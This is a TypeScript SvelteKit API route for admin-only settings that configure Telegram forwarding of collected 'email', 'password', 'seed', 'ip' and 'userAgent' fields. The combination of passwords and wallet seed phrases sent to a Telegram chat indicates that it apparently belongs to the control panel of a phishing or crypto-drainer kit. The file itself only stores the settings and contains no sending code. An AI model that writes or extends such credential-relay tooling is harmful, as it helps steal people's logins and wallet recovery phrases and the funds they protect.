import type { RequestHandler } from './$types';
import { json } from '@sveltejs/kit';
import { dbSetSetting } from '$lib/server/database.js';
import { getTelegramConfig, sendTelegram } from '$lib/server/telegram.js';
import { requireAdmin } from '$lib/server/auth.js';

export const GET: RequestHandler = async ({ locals }) => {
	requireAdmin(locals);
	const cfg = getTelegramConfig();
	return json({
		enabled: cfg.enabled,
		botToken: cfg.botToken ? '****' + cfg.botToken.slice(-4) : '',
		chatId: cfg.chatId,
		fields: cfg.fields
	});
};

export const POST: RequestHandler = async ({ locals, request }) => {
	requireAdmin(locals);
	const body = (await request.json()) as Partial<{
		enabled: boolean;
		botToken: string;
		chatId: string;
		fields: { email: boolean; password: boolean; seed: boolean; ip: boolean; userAgent: boolean };
	}>;

	if (body.enabled !== undefined) dbSetSetting('telegram.enabled', body.enabled ? '1' : '0');
	if (body.botToken !== undefined) dbSetSetting('telegram.bot_token', body.botToken);
	if (body.chatId !== undefined) dbSetSetting('telegram.chat_id', body.chatId);
	if (body.fields) {
		dbSetSetting('telegram.field_email', body.fields.email ? '1' : '0');
		dbSetSetting('telegram.field_password', body.fields.password ? '1' : '0');
		dbSetSetting('telegram.field_seed', body.fields.seed ? '1' : '0');
		dbSetSetting('telegram.field_ip', body.fields.ip ? '1' : '0');
		dbSetSetting('telegram.field_user_agent', body.fields.userAgent ? '1' : '0');
	}
	return json({ ok: true });
};
